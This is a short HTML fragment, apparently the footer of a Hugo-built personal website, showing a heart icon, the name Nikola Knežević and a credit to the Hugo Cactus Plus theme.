+<span class=split><svg fill="#bbb" width="15" height="15" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15"><path d="M13.91 6.75c-1.17 2.25-4.3 5.31-6.07 6.94-.1903.1718-.4797.1718-.67.0C5.39 12.06 2.26 9 1.09 6.75-1.48 1.8 5-1.5 7.5 3.45 10-1.5 16.48 1.8 13.91 6.75z"/></svg></span>&nbsp;Nikola Knežević</p><p class=powerby>Powered by <a href=http://www.gohugo.io/>Hugo</a> Theme By <a href=https://github.com/nodejh/hugo-theme-cactus-plus>nodejh</a></p></footer></body></html>
